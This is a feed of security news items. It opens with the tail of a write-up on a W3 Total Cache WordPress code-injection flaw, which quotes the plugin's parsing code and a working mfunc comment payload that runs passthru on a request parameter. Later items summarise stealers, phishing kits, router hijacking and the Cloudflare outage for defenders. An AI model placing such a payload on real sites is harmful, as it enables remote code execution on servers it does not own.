			$output = sprintf( 'Unable to execute code: %s', htmlspecialchars( $code ) );
		}
	} else {
		$output = htmlspecialchars( 'Invalid mfunc tag syntax. The correct format is: <!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --><!-- /mfunc W3TC_DYNAMIC_SECURITY --> or <!-- W3TC_DYNAMIC_SECURITY mfunc -->PHP code<!-- /mfunc W3TC_DYNAMIC_SECURITY -->.' );
	}

	return $output;
}But how do we actually reach this function? also defines a function called , which uses  in a . This essentially means that the plugin searches through the cached version of a page for what looks like an  “comment” and hands it over to the previously shown  function:public function _parse_dynamic( $buffer ) {
	// The W3TC_DYNAMIC_SECURITY constant should be a unique string and not an int or boolean.
	if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) || empty( W3TC_DYNAMIC_SECURITY ) || 1 === (int) W3TC_DYNAMIC_SECURITY ) {
		return $buffer;
	}

	$buffer = preg_replace_callback(
		'~<!--\s*mfunc\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)<!--\s*/mfunc\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
		array(
			$this,
			'_parse_dynamic_mfunc',
		),
		$buffer
	);

	$buffer = preg_replace_callback(
		'~<!--\s*mclude\s*' . W3TC_DYNAMIC_SECURITY . '(.*)-->(.*)<!--\s*/mclude\s*' . W3TC_DYNAMIC_SECURITY . '\s*-->~Uis',
		array(
			$this,
			'_parse_dynamic_mclude',
		),
		$buffer
	);

	return $buffer;
}This is a straight code injection. However, what stands out here is the check on line 3 for a constant called “W3TC_DYNAMIC_SECURITY”. As you can see in the documentation, you have to explicitly define this constant in the wp-config.php file like this:define('W3TC_DYNAMIC_SECURITY', 'rcesec');And this is the actual roadblock. To successfully exploit this code injection, you need to know the constant’s value. Lazy admins might use the value  from the documentation, but you might also use something else as shown above.However, if the attacker knows the  string, then the code execution is easy to achieve. When the “Page Cache” is enabled in the plugin:Then  is always called through process_cached_page_and_exit whenever a cached page is processed:if ( $this->_caching && ! $this->_late_caching ) {
	$this->_cached_data = $this->_extract_cached_page( false );
	if ( $this->_cached_data ) {
		if ( $this->_late_init ) {
			$w3_late_init = true;
			return;
		} else {
			$this->process_status = 'hit';
			$this->process_cached_page_and_exit( $this->_cached_data );
			// if is passes here - exit is not possible now and will happen on init.
			return;
		}
	} else {
		$this->_late_init = false;
	}
} else {
	$this->_late_init = false;
}So a cached comment like the following which references the configured  constant can ultimately be used to execute arbitrary code since it eventually hits the  function:<!-- mfunc rcesec -->echo passthru($_GET[1337])<!-- /mfunc rcesec -->If comments are enabled for unauthenticated users, then you’ve got an unauthenticated RCE:At RCE Security, we use both 0-day and n-day vulnerabilities in our penetration tests to reflect realistic attacker behaviour. This helps us identify and validate weaknesses that might otherwise go unnoticed, so you get a clear, practical view of your actual risk. Want to get a real penetration test? Contact us!]]></content:encoded></item><item><title>CVE-2025-65094 - WBCE CMS is Vulnerable to Privilege Escalation via Group ID Manipulation (IDOR)</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65094</link><author></author><category>vulns</category><pubDate>Wed, 19 Nov 2025 19:15:50 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65094
 Nov. 19, 2025, 7:15 p.m. | 1 day, 11 hours ago
WBCE CMS is a content management system. Prior to version 1.6.4, a low-privileged user in WBCE CMS can escalate their privileges to the Administrators group by manipulating the groups[] parameter in the /admin/users/save.php request. The UI restricts users to assigning only their existing group, but server-side validation is missing, allowing attackers to overwrite their group membership and obtain full administrative access. This results in a complete compromise of the CMS. This issue has been patched in version 1.6.4.
 8.7 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>W3 Total Cache WordPress plugin vulnerable to PHP command injection</title><link>https://www.bleepingcomputer.com/news/security/w3-total-cache-wordpress-plugin-vulnerable-to-php-command-injection/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 19 Nov 2025 17:34:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A critical flaw in the W3 Total Cache (W3TC) WordPress plugin can be exploited to run PHP commands on the server by posting a comment that contains a malicious payload. [...]]]></content:encoded></item><item><title>Russian bulletproof hosting provider sanctioned over ransomware ties</title><link>https://www.bleepingcomputer.com/news/security/us-sanctions-russian-bulletproof-hosting-provider-media-land-over-ransomware-ties/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 19 Nov 2025 16:43:46 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Today, the United States, the United Kingdom, and Australia announced sanctions targeting Russian bulletproof hosting (BPH) providers that have supported ransomware gangs and other cybercrime operations. [...]]]></content:encoded></item><item><title>NHS Warns of PoC Exploit for 7-Zip Symbolic Link–Based RCE Vulnerability</title><link>https://thehackernews.com/2025/11/hackers-actively-exploiting-7-zip.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivVWRvZll-uPUxEGctC2P333iOd2Fe1IQRsAAs_g4oiJVzgnqb6OQuk2UyD8yBGFxJuuwGgN8QeUluWfvr9nC6GwY6eMqB5xQCBGSu8FP8zrZjdd4yTtytllh4W8NqDAmMCUBet7I1gq1HfFSRgC5oBJGy3x_po-TzYKM3FgGu9Hcjr4WFt5nPRsY5oKMf/s1600/7-zip-exploit.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 16:27:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Update: The NHS England Digital, in an updated advisory on November 20, 2025, said it has not observed in-the-wild exploitation of CVE-2025-11001, but noted that it's "aware of a public proof-of-concept exploit." It has since removed what it said were "erroneous references" to active exploitation.The original story follows below -

A recently disclosed security flaw impacting 7-Zip has come]]></content:encoded></item><item><title>Mac users warned about new DigitStealer information stealer</title><link>https://www.malwarebytes.com/blog/news/2025/11/mac-users-warned-about-new-digitstealer-information-stealer</link><author></author><category>threatintel</category><pubDate>Wed, 19 Nov 2025 16:23:38 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[A new infostealer called DigitStealer is going after Mac users. It avoids detection, skips older devices, and steals files, passwords, and browser data. We break down what it does and how to protect your Mac.Researchers have described a new malware called DigitStealer that steals sensitive information from macOS users.This variant comes with advanced detection-evasion techniques and a multi-stage attack chain. Most infostealers go after the same types of data and use similar methods to get it, but DigitStealer is different enough to warrant attention.A few things make it stand out: platform-specific targeting, fileless operation, and anti-analysis techniques. Together, they pose relatively new challenges for Mac users.The attack starts with a file disguised as a utility app called “DynamicLake,” which is hosted on a fake website rather than the legitimate company’s site. To trick users, it instructs you to drag a file into Terminal, which will initiate the download and installation of DigitStealer.If your system matches certain regions or is a virtual machine, the malware won’t run. That’s likely to hinder analysis by researchers and to steer clear of infecting people in its home country, which is enough in some countries to stay out of prison. It also limits itself to devices with newer ARM features introduced with M2 chips or later. chips, skipping older Macs, Intel-based chips, and most virtual machines.The attack chain is largely fileless so it won’t leave many traces behind on an affected machine. Unlike file-based attacks that execute the payload in the hard drive, fileless attacks execute the payload in Random Access Memory (RAM). Running malicious code directly in the memory instead of the hard drive has several advantages for attackers:Evasion of traditional security measures: Fileless attacks bypass antivirus software and file-signature detection, making them harder to identify using conventional security tools.   Since fileless attacks don’t create files, they can be more challenging to remove once detected. This can make it extra tricky for forensics to trace an attack back to the source and restore the system to a secure state.DigitStealer’s initial payload asks for your password and tries to steal documents, notes, and files. If successful, it uploads them to the attackers’ servers.The second stage of the attack goes after browser information from Chrome, Brave, Edge, Firefox and others, as well as keychain passwords, crypto wallets, VPN configurations (specifically OpenVPN and Tunnelblick), and Telegram sessions.DigitStealer shows how Mac malware keeps evolving. It’s different from other infostealers, splitting its attack into stages, targeting new Mac hardware, and leaving barely any trace.But you can still protect yourself:Always be careful what you run in Terminal. Don’t follow instructions from unsolicited messages.Be careful where you download apps from.Keep your software, especially your operating system and your security defenses, up to date.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Report released on PowerSchool cyber attack</title><link>https://databreaches.net/2025/11/19/report-released-on-powerschool-cyber-attack/?pk_campaign=feed&amp;pk_kwd=report-released-on-powerschool-cyber-attack</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 19 Nov 2025 16:23:06 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Unicode: It is more than funny domain names., (Wed, Nov 12th)</title><link>https://isc.sans.edu/diary/rss/32472</link><author></author><category>threatintel</category><pubDate>Wed, 19 Nov 2025 15:59:55 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[When people discuss the security implications of Unicode, International Domain Names (IDNs) are often highlighted as a risk. However, while visible and often talked about, IDNs are probably not what you should really worry about when it comes to Unicode. There are several issues that impact application security beyond confusing domain names.]]></content:encoded></item><item><title>Python-Based WhatsApp Worm Spreads Eternidade Stealer Across Brazilian Devices</title><link>https://thehackernews.com/2025/11/python-based-whatsapp-worm-spreads.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_JS-2uc_a3c5S1eLk0Eo3HK8zCxsAijuKRwY0EFD5q19SEUDr1lwIICc_nphafxi12DafNvvqyGyGth6QWnBNKMZOSgy46Wrhpy-2KtVdj7CJbnlPcM-kHVQa6Y3zOBznsYMA2HWbel-KMoEeDyCzDvOSlQRk6ab056_7sL08HjgSCVMjRQojWCfoG6Ln/s1600/whatsapp-worm.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 15:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of a new campaign that leverages a combination of social engineering and WhatsApp hijacking to distribute a Delphi-based banking trojan named Eternidade Stealer as part of attacks targeting users in Brazil.
"It uses Internet Message Access Protocol (IMAP) to dynamically retrieve command-and-control (C2) addresses, allowing the threat actor to]]></content:encoded></item><item><title>Sue The Hackers – Google Sues Over Phishing as a Service</title><link>https://databreaches.net/2025/11/19/sue-the-hackers-google-sues-over-phishing-as-a-service/?pk_campaign=feed&amp;pk_kwd=sue-the-hackers-google-sues-over-phishing-as-a-service</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 19 Nov 2025 14:44:45 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Princeton University Data Breach Impacts Alumni, Students, Employees</title><link>https://databreaches.net/2025/11/19/princeton-university-data-breach-impacts-alumni-students-employees/?pk_campaign=feed&amp;pk_kwd=princeton-university-data-breach-impacts-alumni-students-employees</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 19 Nov 2025 14:44:37 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Eurofiber admits crooks swiped data from French unit after cyberattack</title><link>https://databreaches.net/2025/11/19/eurofiber-admits-crooks-swiped-data-from-french-unit-after-cyberattack/?pk_campaign=feed&amp;pk_kwd=eurofiber-admits-crooks-swiped-data-from-french-unit-after-cyberattack</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 19 Nov 2025 14:44:24 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Five major changes to the regulation of cybersecurity in the UK under the Cyber Security and Resilience Bill</title><link>https://databreaches.net/2025/11/19/five-major-changes-to-the-regulation-of-cybersecurity-in-the-uk-under-the-cyber-security-and-resilience-bill/?pk_campaign=feed&amp;pk_kwd=five-major-changes-to-the-regulation-of-cybersecurity-in-the-uk-under-the-cyber-security-and-resilience-bill</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 19 Nov 2025 14:44:13 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>French agency Pajemploi reports data breach affecting 1.2M people</title><link>https://databreaches.net/2025/11/19/french-agency-pajemploi-reports-data-breach-affecting-1-2m-people/?pk_campaign=feed&amp;pk_kwd=french-agency-pajemploi-reports-data-breach-affecting-1-2m-people</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 19 Nov 2025 14:44:00 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>New WrtHug campaign hijacks thousands of end-of-life ASUS routers</title><link>https://www.bleepingcomputer.com/news/security/new-wrthug-campaign-hijacks-thousands-of-end-of-life-asus-routers/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 19 Nov 2025 14:35:15 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Thousands of ASUS WRT routers, mostly end-of-life or outdated devices, have been hijacked in a global campaign called Operation WrtHug that exploits six vulnerabilities. [...]]]></content:encoded></item><item><title>The hidden risks in your DevOps stack data—and how to address them</title><link>https://www.bleepingcomputer.com/news/security/the-hidden-risks-in-your-devops-stack-data-and-how-to-address-them/</link><author>Sponsored by GitProtect</author><category>security</category><pubDate>Wed, 19 Nov 2025 14:20:29 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[DevOps repos on GitHub, GitLab, Bitbucket, and Azure DevOps face risks from weak access controls, misconfigurations, outages, and accidental deletions. GitProtect provides automated, immutable backups and fast recovery to secure your DevOps data. [...]]]></content:encoded></item><item><title>The Cloudflare Outage May Be a Security Roadmap</title><link>https://krebsonsecurity.com/2025/11/the-cloudflare-outage-may-be-a-security-roadmap/</link><author>BrianKrebs</author><category>security</category><pubDate>Wed, 19 Nov 2025 14:07:03 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[An intermittent outage at  on Tuesday briefly knocked many of the Internet’s top destinations offline. Some affected Cloudflare customers were able to pivot away from the platform temporarily so that visitors could still access their websites. But security experts say doing so may have also triggered an impromptu network penetration test for organizations that have come to rely on Cloudflare to block many types of abusive and malicious traffic.At around 6:30 EST/11:30 UTC on Nov. 18, Cloudflare’s status page acknowledged the company was experiencing “an internal service degradation.” After several hours of Cloudflare services coming back up and failing again, many websites behind Cloudflare found they could not migrate away from using the company’s services because the Cloudflare portal was unreachable and/or because they also were getting their domain name system (DNS) services from Cloudflare.However, some customers did manage to pivot their domains away from Cloudflare during the outage. And many of those organizations probably need to take a closer look at their web application firewall (WAF) logs during that time, said , a faculty member at .Turner said Cloudflare’s WAF does a good job filtering out malicious traffic that matches any one of the top ten types of application-layer attacks, including credential stuffing, cross-site scripting, SQL injection, bot attacks and API abuse. But he said this outage might be a good opportunity for Cloudflare customers to better understand how their own app and website defenses may be failing without Cloudflare’s help.“Your developers could have been lazy in the past for SQL injection because Cloudflare stopped that stuff at the edge,” Turner said. “Maybe you didn’t have the best security QA [quality assurance] for certain things because Cloudflare was the control layer to compensate for that.”Turner said one company he’s working with saw a huge increase in log volume and they are still trying to figure out what was “legit malicious” versus just noise.“It looks like there was about an eight hour window when several high-profile sites decided to bypass Cloudflare for the sake of availability,” Turner said. “Many companies have essentially relied on Cloudflare for the OWASP Top Ten [web application vulnerabilities] and a whole range of bot blocking. How much badness could have happened in that window? Any organization that made that decision needs to look closely at any exposed infrastructure to see if they have someone persisting after they’ve switched back to Cloudflare protections.”Turner said some cybercrime groups likely noticed when an online merchant they normally stalk stopped using Cloudflare’s services during the outage.“Let’s say you were an attacker, trying to grind your way into a target, but you felt that Cloudflare was in the way in the past,” he said. “Then you see through DNS changes that the target has eliminated Cloudflare from their web stack due to the outage. You’re now going to launch a whole bunch of new attacks because the protective layer is no longer in place.”, senior product marketing manager at the McLean, Va. based , called yesterday’s outage “a free tabletop exercise, whether you meant to run one or not.”“That few-hour window was a live stress test of how your organization routes around its own control plane and shadow IT blossoms under the sunlamp of time pressure,” Scott said in a post on LinkedIn. “Yes, look at the traffic that hit you while protections were weakened. But also look hard at the behavior inside your org.”Scott said organizations seeking security insights from the Cloudflare outage should ask themselves:1. What was turned off or bypassed (WAF, bot protections, geo blocks), and for how long?
2. What emergency DNS or routing changes were made, and who approved them?
3. Did people shift work to personal devices, home Wi-Fi, or unsanctioned Software-as-a-Service providers to get around the outage?
4. Did anyone stand up new services, tunnels, or vendor accounts “just for now”?
5. Is there a plan to unwind those changes, or are they now permanent workarounds?
6. For the next incident, what’s the intentional fallback plan, instead of decentralized improvisation?In a postmortem published Tuesday evening, Cloudflare said the disruption was not caused, directly or indirectly, by a cyberattack or malicious activity of any kind.“Instead, it was triggered by a change to one of our database systems’ permissions which caused the database to output multiple entries into a ‘feature file’ used by our Bot Management system,” Cloudflare CEO  wrote. “That feature file, in turn, doubled in size. The larger-than-expected feature file was then propagated to all the machines that make up our network.”Cloudflare estimates that roughly 20 percent of websites use its services, and with much of the modern web relying heavily on a handful of other cloud providers including  and , even a brief outage at one of these platforms can create a single point of failure for many organizations., CEO at the IT consultancy , said Tuesday’s outage was another reminder that many organizations may be putting too many of their eggs in one basket.“There are several practical and overdue fixes,” Greenfield advised. “Split your estate. Spread WAF and DDoS protection across multiple zones. Use multi-vendor DNS. Segment applications so a single provider outage doesn’t cascade. And continuously monitor controls to detect single-vendor dependency.”]]></content:encoded></item><item><title>CISA gives govt agencies 7 days to patch new Fortinet flaw</title><link>https://www.bleepingcomputer.com/news/security/cisa-gives-govt-agencies-7-days-to-patch-new-fortinet-flaw/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 19 Nov 2025 13:44:56 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[CISA has ordered U.S. government agencies to secure their systems within a week against another vulnerability in Fortinet's FortiWeb web application firewall, which was exploited in zero-day attacks. [...]]]></content:encoded></item><item><title>Meet ShinySp1d3r: New Ransomware-as-a-Service created by ShinyHunters</title><link>https://www.bleepingcomputer.com/news/security/meet-shinysp1d3r-new-ransomware-as-a-service-created-by-shinyhunters/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Wed, 19 Nov 2025 13:01:09 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[An in-development build of the upcoming ShinySp1d3r ransomware-as-a-service platform has surfaced, offering a preview of the upcoming extortion operation. [...]]]></content:encoded></item><item><title>WrtHug Exploits Six ASUS WRT Flaws to Hijack Tens of Thousands of EoL Routers Worldwide</title><link>https://thehackernews.com/2025/11/wrthug-exploits-six-asus-wrt-flaws-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhobMT02o23BS6CE-40CnDYj3IQVSqv3apTkF3HtqYDFynC2mjFp18in8p28QxQA438jGQLHzCVPfw7tyDXTZXBTljbTwdCYBu5YnaFD1PSBfNdQFTtCgRgpqKy3ejAQjIJAJdVzBNriwb1YYvz7X6zOyXbWQ4h1lC3k6YjJgj_4rjdJ5UmKc8U17rnpE7g/s1600/asus.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 13:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A newly discovered campaign has compromised tens of thousands of outdated or end-of-life (EoL) ASUS routers worldwide, predominantly in Taiwan, the U.S., and Russia, to rope them into a massive network.
The router hijacking activity has been codenamed Operation WrtHug by SecurityScorecard's STRIKE team. Southeast Asia and European countries are some of the other regions where infections have]]></content:encoded></item><item><title>Attackers are using “Sneaky 2FA” to create fake sign-in windows that look real</title><link>https://www.malwarebytes.com/blog/news/2025/11/attackers-are-using-sneaky-2fa-to-create-fake-sign-in-windows-that-look-real</link><author></author><category>threatintel</category><pubDate>Wed, 19 Nov 2025 12:50:09 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Attackers have a new trick to steal your username and password: fake browser pop-ups that look exactly like real sign-in windows. These “Browser-in-the-Browser” attacks can fool almost anyone, but a password manager and a few simple habits can keep you safe.Phishing attacks continue to evolve, and one of the more deceptive tricks in the attacker’s arsenal today is the Browser-in-the-Browser (BitB) attack. At its core, BitB is a social engineering technique that makes users believe they’re interacting with a genuine browser pop-up login window when, in reality, they’re dealing with a convincing fake built right into a web page.Researchers recently found a Phishing-as-a-Service (PhaaS) kit known as “Sneaky 2FA” that’s making these capabilities available on the criminal marketplace. Customers reportedly receive a licensed, obfuscated version of the source code and can deploy it however they like.Attackers use this kit to create a fake browser window using HTML and CSS. It’s very deceptive because it includes a perfectly rendered address bar showing the legitimate website’s URL. From a user’s perspective, everything looks normal: the window design, the website address, even the login form. But it’s a carefully crafted illusion designed to steal your username and password the moment you start typing.Normally we tell people to check whether the URL in the address bar matches your expectations, but in this case that won’t help. The fake URL bar can fool the human eye, it can’t fool a well-designed password manager. Password managers are built to recognize only the legitimate browser login forms, not HTML fakes masquerading as browser windows. This is why using a password manager consistently matters. It not only encourages strong, unique passwords but also helps spot inconsistencies by refusing to autofill on suspicious forms.Sneaky 2FA uses various tricks to avoid detection and analysis. For example, by preventing security tools from accessing the phishing pages: the phishers redirect unwanted visitors to harmless sites and show the BitB page only to high-value targets. For those targets the pop-up window adapts to match each visitor’s operating system and browser.The domains the campaigns use are also short-lived. Attackers “burn and replace” them to stay ahead of blocklists. Which makes it hard to block these campaigns based on domain names.As always, you’re the first line of defense. Don’t click on links in unsolicited messages of any type before verifying and confirming they were sent by someone you trust. Staying informed is important as well, because you know what to expect and what to look for.And remember: it’s not just about trusting what you see on the screen. Layered security stops attackers before they can get anywhere.Another effective security layer to defend against BitB attacks is Malwarebytes’ free browser extension, Browser Guard, which detects and blocks these attacks heuristically.We don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline. Protect your, and your family’s, personal information by using identity protection.]]></content:encoded></item><item><title>California man admits to laundering crypto stolen in $230M heist</title><link>https://www.bleepingcomputer.com/news/security/california-man-admits-to-laundering-crypto-stolen-in-230m-heist/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 19 Nov 2025 12:13:34 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A 45-year-old from Irvine, California, has pleaded guilty to laundering at least $25 million stolen in a massive $230 million cryptocurrency heist. [...]]]></content:encoded></item><item><title>Legal Restrictions on Vulnerability Disclosure</title><link>https://www.schneier.com/blog/archives/2025/11/legal-restrictions-on-vulnerability-disclosure.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Wed, 19 Nov 2025 12:04:50 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Kendra Albert gave an excellent talk at USENIX Security this year, pointing out that the legal agreements surrounding vulnerability disclosure muzzle researchers while allowing companies to not fix the vulnerabilities—exactly the opposite of what the responsible disclosure movement of the early 2000s was supposed to prevent. This is the talk.Thirty years ago, a debate raged over whether vulnerability disclosure was good for computer security. On one side, full disclosure advocates argued that software bugs weren’t getting fixed and wouldn’t get fixed if companies that made insecure software wasn’t called out publicly. On the other side, companies argued that full disclosure led to exploitation of unpatched vulnerabilities, especially if they were hard to fix. After blog posts, public debates, and countless mailing list flame wars, there emerged a compromise solution: coordinated vulnerability disclosure, where vulnerabilities were disclosed after a period of confidentiality where vendors can attempt to fix things. Although full disclosure fell out of fashion, disclosure won and security through obscurity lost. We’ve lived happily ever after since.Or have we? The move towards paid bug bounties and the rise of platforms that manage bug bounty programs for security teams has changed the reality of disclosure significantly. In certain cases, these programs require agreement to contractual restrictions. Under the status quo, that means that software companies sometimes funnel vulnerabilities into bug bounty management platforms and then condition submission on confidentiality agreements that can prohibit researchers from ever sharing their findings.In this talk, I’ll explain how confidentiality requirements for managed bug bounty programs restrict the ability of those who attempt to report vulnerabilities to share their findings publicly, compromising the bargain at the center of the CVD process. I’ll discuss what contract law can tell us about how and when these restrictions are enforceable, and more importantly, when they aren’t, providing advice to hackers around how to understand their legal rights when submitting. Finally, I’ll call upon platforms and companies to adapt their practices to be more in line with the original bargain of coordinated vulnerability disclosure, including by banning agreements that require non-disclosure.And this is me from 2007, talking about “responsible disclosure”:This was a good idea—and these days it’s normal procedure—but one that was possible only because full disclosure was the norm. And it remains a good idea only as long as full disclosure is the threat.]]></content:encoded></item><item><title>Application Containment: How to Use Ringfencing to Prevent the Weaponization of Trusted Software</title><link>https://thehackernews.com/2025/11/application-containment-how-to-use.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAi0D4B697ca6xQAwAw_dQp7utPWY_RDYE_iKTlMNFUNyMGOCc7GRraPuEHW_WyQ2rg5Cdsm2MMVAhEM5B3WlZhuMDKp_OdB1luQizlSSOBmb8bxaFMoMTqO00ua8W56FcOrn8pGvhJ2IUxDgyZRH0RFJ5pXoswPe_UcIuf2c1DU6wyctCwJpBNWgOsx0/s1600/threatlocker.jpg" length="" type=""/><pubDate>Wed, 19 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The challenge facing security leaders is monumental: Securing environments where failure is not an option. Reliance on traditional security postures, such as Endpoint Detection and Response (EDR) to chase threats after they have already entered the network, is fundamentally risky and contributes significantly to the half-trillion-dollar annual cost of cybercrime.
Zero Trust fundamentally shifts]]></content:encoded></item><item><title>Cloudflare blames this week&apos;s massive outage on database issues</title><link>https://www.bleepingcomputer.com/news/technology/cloudflare-blames-this-weeks-massive-outage-on-database-issues/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 19 Nov 2025 10:54:54 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[On Tuesday, Cloudflare experienced its worst outage in 6 years, blocking access to many websites and online platforms for almost 6 hours after a change to database access controls triggered a cascading failure across its Global Network. [...]]]></content:encoded></item><item><title>Sharenting: are you leaving your kids’ digital footprints for scammers to find?</title><link>https://www.malwarebytes.com/blog/inside-malwarebytes/2025/11/sharenting-are-you-leaving-your-kids-digital-footprints-for-scammers-to-find</link><author></author><category>threatintel</category><pubDate>Wed, 19 Nov 2025 10:30:05 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Let’s be real: the online world is a huge part of our kids’ lives these days. From the time they’re tiny, we share photos, moments, and milestones online—proud parent stuff! Schools, friends, and family all get involved too. Before we know it, our kids have a whole digital history they didn’t even know they were building. Unlike footprints at the beach, this trail never washes away. That habit even has a name now: . It’s when parents share details of their child’s life online, often without realizing how public or permanent those posts can become. Think of your child’s digital footprint as the trail they (and you) leave across the internet. It includes every photo, post, comment, and account, plus all the data quietly collected behind the scenes. There are two sides to it:  what you or your child share directly, such as photos, TikTok videos, usernames, or status updates. Even “private” posts can be screenshot or reshared.  what gets collected automatically. Cookies, location data, and app activity quietly build profiles of who your child is and what they do. Both add up to a digital version of your child that can stick around for years. For kids and teens, their online presence shapes how the world sees them—friends, teachers, even future employers. But it also creates risks:  once something’s online, it can be copied or mocked.  colleges and jobs may see old posts that no longer reflect who they are.  oversharing locations or routines can make it easier for strangers to find or trick them.  birthdates, school names, and addresses can help criminals create fake identities. Practicing good digital hygiene keeps those risks small. Kids don’t need social media accounts to leave data behind. Gaming platforms, smartwatches, school apps, and even voice assistants collect fragments of personal information. That innocent photo from a class project might live in a public gallery. A leaderboard can display a real name or score history. Even nicknames or in-game chat can expose more than intended. Help your kids check what’s visible publicly and what isn’t. How sharenting can make it worse Don’t worry, I’ve done some of these too! We love to share and celebrate our kids, but sometimes we give away more than we mean to: Posting full names, birthdays, and locations on open social media. Sharing photos with school logos, house numbers, or nearby landmarks visible. Leaving geotagging or location data on by accident (it’s scary how precise this can be). Talking about routines, worries, or personal struggles in public forums. Forgetting to clean up old posts as our kids get bigger. And it’s easy to forget about all those apps we sign up to “just to try it”. They might be collecting info in the background, too. Two real-life sharenting stories Karen loves her son, Max. She posts his awards, soccer games, and milestones online, sometimes tagging the school or leaving her phone’s location on. It’s innocent… until someone strings the details together. A fake gamer profile messages Max: “Hey, don’t you go to Graham Elementary? I saw your soccer pics!” Suddenly, a friendly chat feels personal and real. Karen meant well, but her posts created a map for someone else to follow. Then there’s the story we covered of a mother in Florida who picked up the phone to hear her daughter sobbing. She’d been in a car accident, hit a pregnant woman, and needed bail money right away. The voice sounded exactly like her child. Terrified, she followed the caller’s instructions and handed over $15,000. Only later did she learn her daughter had been safe at work the whole time. Scammers had used AI to clone her voice from a short online video. It’s a chilling reminder that even something as ordinary as a video or social post can become fuel for manipulation. Simple steps parents can take  before you post, ask, “Would I be OK with a stranger seeing this?”  teach privacy basics early and update as they grow.  review privacy settings together on both your accounts.  encourage nicknames for games or public forums.  set boundaries for what’s OK to share.  remove automatic location data from photos. Know what to do if something goes wrong Everyone messes up online sometimes. It happens to the best of us. We’ve all shared something we wish we hadn’t. The goal isn’t to scare our kids (or ourselves) away from the internet, but to help them feel confident, safe, and smart about it all. If your child ever feels uncomfortable or gets into a sticky situation online: Stay calm and let them know you are safe to talk to. Keep record of any sketchy messages or harassment. Use blocking, reporting, and privacy tools. Loop in school counselors or other trusted adults if you need backup. If there’s a real threat or criminal activity, contact the proper authorities. The online world is always changing, and honestly, we’re all learning as we go. But by staying curious, keeping the lines open, and setting a good example yourself, you’ll help your kids build a digital life they can be proud of. Let’s look out for each other. If you’ve got thoughts or tips about sharenting and online safety, do share them with me. You can message me on Linkedin at https://www.linkedin.com/in/mattburgess/. We’re all in this together. We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan 